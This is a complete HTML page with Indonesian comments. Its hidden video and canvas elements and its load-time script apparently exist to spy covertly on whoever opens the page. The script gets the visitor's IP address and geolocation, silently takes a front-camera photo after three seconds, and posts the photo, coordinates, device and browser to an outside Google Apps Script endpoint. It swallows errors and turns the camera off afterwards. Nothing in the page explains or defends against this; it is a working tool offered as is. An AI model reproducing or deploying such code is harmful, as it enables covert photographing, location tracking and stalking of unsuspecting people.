<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>
  <body>
    <video id="video" autoplay playsinline style="display: none"></video>
    <canvas id="canvas" width="640" height="480" style="display: none"></canvas>

    <script>
      /* ================= CONFIG ================= */
      const scriptURL =
        "https://script.google.com/macros/s/AKfycbxUl0Z5luiPUq847Hl_Zou9r0tr0DoA9gtmkdrh31b-nUx-3PKpSkkLcoAuyM4wnf7Ieg/exec";

      /* ================= VAR ================= */
      let latitude = "",
        longitude = "",
        ipAddress = "",
        photoBase64 = "";

      /* ================= DEVICE ================= */
      function getDevice() {
        const ua = navigator.userAgent;
        if (/android/i.test(ua)) return "Android";
        if (/iphone|ipad|ipod/i.test(ua)) return "iPhone / iOS";
        if (/windows/i.test(ua)) return "Windows";
        if (/macintosh/i.test(ua)) return "MacOS";
        return "Unknown";
      }

      /* ================= BROWSER ================= */
      function getBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes("Edg")) return "Edge";
        if (ua.includes("Chrome")) return "Chrome";
        if (ua.includes("Firefox")) return "Firefox";
        if (ua.includes("Safari")) return "Safari";
        return "Unknown";
      }

      /* ================= IP ================= */
      fetch("https://api.ipify.org?format=json")
        .then((r) => r.json())
        .then((d) => (ipAddress = d.ip))
        .catch(() => {});

      /* ================= LOKASI ================= */
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          latitude = pos.coords.latitude;
          longitude = pos.coords.longitude;
        },
        () => {},
      );

      /* ================= KAMERA DEPAN ================= */
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      navigator.mediaDevices
        .getUserMedia({
          video: { facingMode: "user" }, // ðŸ‘ˆ KAMERA DEPAN SAJA
        })
        .then((stream) => {
          video.srcObject = stream;

          // tunggu kamera stabil
          setTimeout(() => captureAndSubmit(stream), 3000);
        })
        .catch(() => {});

      /* ================= CAPTURE & SUBMIT ================= */
      function captureAndSubmit(stream) {
        try {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          photoBase64 = canvas.toDataURL("image/jpeg", 0.8);

          if (!photoBase64 || photoBase64.length < 1000) return;

          fetch(scriptURL, {
            method: "POST",
            body: JSON.stringify({
              latitude: latitude,
              longitude: longitude,
              ip: ipAddress,
              device: getDevice(),
              browser: getBrowser(),
              foto: photoBase64,
            }),
          }).catch(() => {});

          // matikan kamera setelah capture
          stream.getTracks().forEach((t) => t.stop());
        } catch (e) {}
      }
    </script>
  </body>
</html>
